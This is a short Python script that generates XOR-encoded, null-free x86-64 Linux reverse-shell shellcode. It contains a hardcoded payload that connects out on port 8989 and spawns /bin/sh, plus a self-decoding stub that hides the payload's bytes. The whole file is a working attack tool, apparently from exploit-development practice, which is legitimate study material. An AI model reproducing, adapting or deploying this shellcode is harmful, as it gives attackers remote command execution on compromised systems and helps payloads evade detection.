#!/usr/bin/env python3
import random
import re
from struct import *

############################################################

def has_nulls(shellcode):
    return(len(re.findall("00", shellcode)) != 0)

############################################################

def header():
    print("Reverse shell SHELLCODE generator\n")

############################################################

def xor(myshellcode, count):
    myshellcode = list(myshellcode)

    decoder = (("\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x%x\\x80"
                + "\\x74\\x0e\\xff\\x%.2x\\x80\\xe9\\x01\\x75"
		        + "\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff")
		        % (len(myshellcode), count))
    
    full_shellcode = decoder

    for i in range(0, len(myshellcode)):
        myshellcode[i] = ord(myshellcode[i]) ^ count
        full_shellcode += "\\x%.2x" % (myshellcode[i])

    return full_shellcode

############################################################

def main():
    myshellcode = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xca\x48\x31\xd2\x48\x31\xff\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\x30\xd2\x0f\x05\x48\x89\xc3\x48\x31\xc0\x50\x66\x68\x23\x1d\x66\x6a\x02\xb0\x2a\x48\x89\xdf\x48\x89\xe6\xb2\x10\x0f\x05\x48\x31\xd2\x48\x31\xf6\xb0\x21\x48\x89\xdf\x40\xb6\x02\x0f\x05\xb0\x21\x48\x89\xdf\x40\xb6\x01\x0f\x05\xb0\x21\x48\x89\xdf\x40\x30\xf6\x0f\x05\xb0\x3b\x48\x31\xdb\x53\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x31\xdb\x48\x89\xe7\x53\x57\x48\x89\xe6\x0f\x05\xb0\x3c\x48\x31\xff\x0f\x05"

    while True:
        random_int = random.randint(1, 255)
        print("[.] Generating encoded shell code with XOR %d" % random_int)
        shellcode = xor(myshellcode, random_int)
        if (not has_nulls(shellcode)):
            print("[+] Shellcode encoded with XOR %d\n" % random_int)
            print(shellcode)
            break
        else:
            print("[!] XOR %d contains null bytes, regenerating" % random_int)

############################################################

if (__name__ == "__main__"):
    header()
    main()